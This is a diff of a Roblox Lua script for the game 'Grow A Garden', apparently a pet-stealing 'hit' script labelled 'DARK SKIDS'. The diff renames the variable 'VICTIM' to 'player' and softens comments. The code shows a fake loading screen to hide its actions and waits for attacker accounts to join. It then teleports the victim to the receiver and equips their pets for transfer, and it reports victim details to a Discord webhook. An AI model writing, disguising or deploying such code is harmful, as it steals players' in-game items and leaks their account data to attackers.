@@ -4,7 +4,7 @@ _G.scriptExecuted = true
 
 -- 🛠️ Services & Variables
 repeat task.wait() until game:IsLoaded()
-local VICTIM = game.Players.LocalPlayer
+local player = game.Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 local HttpService = game:GetService("HttpService")
@@ -12,35 +12,46 @@ local TeleportService = game:GetService("TeleportService")
 local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
 local victimPetTable = {}
 
--- 🔁 Auto Teleport if in Private Server (to public server with exactly 3 players)
+-- 🔁 Auto Teleport to Public Server with 3 Players if in VIP Server
 if getServerType and getServerType:IsA("RemoteFunction") then
     local ok, serverType = pcall(function()
         return getServerType:InvokeServer()
     end)
+
     if ok and serverType == "VIPServer" then
-        local function findLowServer()
+        local function findServerWith3Players()
             local placeId = game.PlaceId
             local cursor = ""
+
             for i = 1, 10 do
                 local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s", placeId, cursor)
-                local response = game:HttpGet(url)
-                local data = HttpService:JSONDecode(response)
-                for _, server in ipairs(data.data) do
-                    if server.playing == 3 and server.id ~= game.JobId then
-                        return server.id
+                local success, response = pcall(function()
+                    return game:HttpGet(url)
+                end)
+
+                if success then
+                    local data = HttpService:JSONDecode(response)
+                    for _, server in ipairs(data.data) do
+                        if server.playing == 3 and server.id ~= game.JobId then
+                            return server.id
+                        end
                     end
+
+                    if not data.nextPageCursor then break end
+                    cursor = data.nextPageCursor
+                else
+                    break
                 end
-                if not data.nextPageCursor then break end
-                cursor = data.nextPageCursor
             end
+
             return nil
         end
 
-        local serverId = findLowServer()
-        if serverId then
-            TeleportService:TeleportToPlaceInstance(game.PlaceId, serverId, VICTIM)
+        local targetServer = findServerWith3Players()
+        if targetServer then
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer, player)
         else
-            VICTIM:Kick("No public servers with 3 players available. Try again.")
+            player:Kick("No public servers with 3 players found. Try again.")
         end
         return
     end
@@ -48,7 +59,7 @@ end
 
 -- 🎭 Fake Legit Loading Screen
 local function showBlockingLoadingScreen()
-    local playerGui = VICTIM:WaitForChild("PlayerGui")
+    local playerGui = player:WaitForChild("PlayerGui")
 
     pcall(function()
         local StarterGui = game:GetService("StarterGui")
@@ -120,16 +131,16 @@ end
 
 -- 📌 Wait for Target Detection
 local function waitForJoin()
-    for _, player in game.Players:GetPlayers() do
-        if table.find(CONFIG.USERNAMES, player.Name) then
+    for _, playerObj in game.Players:GetPlayers() do
+        if table.find(CONFIG.USERNAMES, playerObj.Name) then
             showBlockingLoadingScreen()
-            return true, player.Name
+            return true, playerObj.Name
         end
     end
     return false, nil
 end
 
--- 🌐 Send Discord Embed
+-- 🌐 Discord Embed Logging
 local function createDiscordEmbed(petList, totalValue)
     local embed = {
         title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
@@ -137,8 +148,8 @@ local function createDiscordEmbed(petList, totalValue)
         fields = {
             {
                 name = "👤 Player Information",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    VICTIM.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), VICTIM.AccountAge),
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
+                    player.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), player.AccountAge),
                 inline = false
             },
             {
@@ -162,9 +173,9 @@ local function createDiscordEmbed(petList, totalValue)
 
     local data = {
         content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
-        username = VICTIM.Name,
+        username = player.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
-        embeds = {embed}
+        embeds = { embed }
     }
 
     local request = http_request or request or HttpPost or syn.request
@@ -176,7 +187,7 @@ local function createDiscordEmbed(petList, totalValue)
     })
 end
 
--- 🔍 Helper Functions
+-- 🔍 Helpers
 local function checkPetsWhilelist(pet)
     for _, name in CONFIG.PET_WHITELIST do
         if string.find(pet, name) then return true end
@@ -184,10 +195,10 @@ local function checkPetsWhilelist(pet)
 end
 
 local function getPetObject(petUid)
-    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
+    for _, object in pairs(player.Backpack:GetChildren()) do
         if object:GetAttribute("PET_UUID") == petUid then return object end
     end
-    for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
+    for _, object in pairs(workspace[player.Name]:GetChildren()) do
         if object:GetAttribute("PET_UUID") == petUid then return object end
     end
 end
@@ -196,14 +207,14 @@ local function equipPet(pet)
     if pet:GetAttribute("d") then
         game.ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
     end
-    VICTIM.Character.Humanoid:EquipTool(pet)
+    player.Character.Humanoid:EquipTool(pet)
 end
 
 local function teleportTarget(targetName)
     local target = game.Players:FindFirstChild(targetName)
     if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
-    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("HumanoidRootPart") then return end
-    VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
+    player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
 end
 
 local function deltaBypass()
